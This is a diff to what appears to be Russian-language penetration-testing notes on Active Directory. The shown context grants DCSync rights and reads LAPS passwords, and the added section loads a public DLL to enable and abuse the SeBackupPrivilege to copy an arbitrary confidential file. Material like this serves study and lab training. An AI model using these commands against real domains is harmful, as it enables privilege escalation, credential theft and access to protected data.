@@ -624,3 +624,18 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
   runas /netonly /user:bk-admin "cmd.exe"
   Get-AdmPwdPassword -ComputerName Creds-Harvestin
 
+# Группы в домене 
+        SeBackup и SeRestore
+        Нужны DLL чтобы сделать enable эти права у пользователя
+        Они есть в релизе к этому разделу
+        https://github.com/giuliano108/SeBackupPrivilege
+
+        Import-Module .\SeBackupPrivilegeUtils.dll
+        Import-Module .\SeBackupPrivilegeCmdLets.dll
+        Set-SeBackupPrivilege
+        Get-SeBackupPrivilege
+
+        Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+
+        и можем копировать что угодно
+        
